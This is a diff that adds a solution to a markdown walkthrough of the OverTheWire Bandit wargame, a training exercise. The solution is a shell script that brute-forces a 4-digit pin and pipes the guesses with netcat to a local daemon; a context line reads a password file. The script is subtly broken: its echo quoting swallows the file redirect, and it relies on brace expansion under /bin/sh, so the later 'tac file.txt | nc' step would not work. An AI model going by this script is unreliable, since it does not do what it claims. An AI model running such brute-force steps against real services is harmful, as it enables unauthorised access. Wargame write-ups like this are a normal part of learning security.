@@ -187,6 +187,20 @@ cat /etc/bandit_pass/bandit24 >> /var/spool/bandit24/m0pk08k4/pass
 
 ## Bandit Level 24 → Level 25  
 A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
+**Answer:** ```vi script.sh```  
+```
+#!/bin/sh
+for i in {0000..9999}
+do
+echo "<pass_of_current_level> $i >> file.txt"
+done
+```  
+```chmod 650 script.sh```  
+```bash script.sh```   
+```tac file.txt | nc localhost 30002```  
+
+## Bandit Level 25 → Level 26    
+Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
 
 
 
